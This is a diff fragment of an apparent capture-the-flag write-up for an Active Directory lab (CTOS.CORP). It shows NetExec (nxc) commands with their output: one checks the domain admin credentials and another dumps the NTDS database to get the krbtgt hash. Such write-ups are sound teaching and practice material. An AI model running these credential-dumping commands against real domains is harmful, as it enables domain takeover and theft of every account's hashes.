@@ -1342,11 +1342,7 @@ SeDelegateSessionUserImpersonatePrivilege Obtain an impersonation token for anot
 
 Domain admin, now i can use these privs to dump the NTDS and get the krbtgt account hash needed to complete the challenge
 
-```python
-nxc smb dc01.ctos.corp -u john -p 'H4x00r123..'                            
-SMB         10.1.201.146    445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:CTOS.CORP) (signing:True) (SMBv1:None) (Null Auth:True)
-SMB         10.1.201.146    445    DC01             [+] CTOS.CORP\john:H4x00r123.. (Pwn3d!)
-                                                                                                              
+```python 
 ┌──[kali@kali]──[192.168.86.130]──[~/hsm/CTOS/pyGPOAbuse]──[ master]
 └───╼ $ nxc smb dc01.ctos.corp -u john -p 'H4x00r123..' --ntds
 SMB         10.1.201.146    445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:CTOS.CORP) (signing:True) (SMBv1:None) (Null Auth:True)
